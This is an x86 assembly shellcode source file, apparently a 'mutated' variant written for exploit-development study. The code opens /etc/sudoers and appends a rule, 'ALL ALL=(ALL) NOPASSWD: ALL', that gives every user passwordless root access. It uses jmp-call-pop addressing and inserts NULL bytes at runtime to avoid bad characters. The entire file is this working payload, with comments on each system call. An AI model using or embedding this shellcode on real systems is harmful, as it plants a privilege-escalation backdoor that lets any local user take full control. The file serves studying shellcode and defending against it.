; File: shellcode_3_edit_sudoers_mutated.nasm
; Author: Petr Javorik

global _start

section .text

_start:

    jmp short getdata

run:

    ; open("/etc/sudoers", O_WRONLY|O_APPEND)
    pop ebx
    mov byte [ebx +12], cl      ; insert NULL terminator
    mov byte [ebx +40], 0xa     ; insert \n
    mov cx, 0x401               ; O_WRONLY|O_APPEND
    push 0x5
    pop eax
    int 0x80

    ; write(fd, "ALL ALL=(ALL) NOPASSWD: ALL/n", 0x1c(28))
    lea ecx, [ebx +13]
    mov ebx, eax
    push 0x1c
    pop edx
    push 0x4
    pop eax
    int 0x80

    ; close(fd)
    push 0x6
    pop eax
    int 0x80

    ; exit(0)
    push 0x1
    pop eax
    int 0x80

getdata:

    call run
    data1: db "/etc/sudoers", 0xaa
    data2: db "ALL ALL=(ALL) NOPASSWD: ALL", 0xaa
